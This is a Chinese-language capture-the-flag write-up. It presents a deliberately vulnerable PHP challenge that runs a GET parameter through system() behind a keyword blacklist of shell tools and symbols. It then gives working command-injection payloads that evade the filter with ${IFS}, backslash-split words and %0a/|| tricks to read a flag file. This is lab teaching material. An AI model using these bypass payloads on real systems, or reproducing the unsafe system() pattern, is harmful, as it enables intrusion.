```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

分析源码

过滤了

;

cat

flag

空格

数字

*

more

less

head

sort

tail

sed

cut

tac

awk

strings

od

curl

`

%

\x09即水平制表符

\x26即&符号

\>

\<





### 第一种

利用${IFS}绕过空格

利用%0a绕过无回显

利用\绕过字母

```
?c=ls||
```

![image-20250403160814159](./assets/image-20250403160814159.png)

```
?c=ca\t${IFS}fl\ag.php||
```

![image-20250403160844596](./assets/image-20250403160844596.png)

提示flag在根目录

```
?c=ls${IFS}/||
```

![image-20250403160920899](./assets/image-20250403160920899.png)

```
?c=ca\t${IFS}/fl\ag||
```

![image-20250403160932623](./assets/image-20250403160932623.png)





### 第二种

利用$IFS绕过空格

利用%0a绕过无回显

```
?c=ca\t$IFS/fl\ag%0a
```

![image-20250403161047826](./assets/image-20250403161047826.png)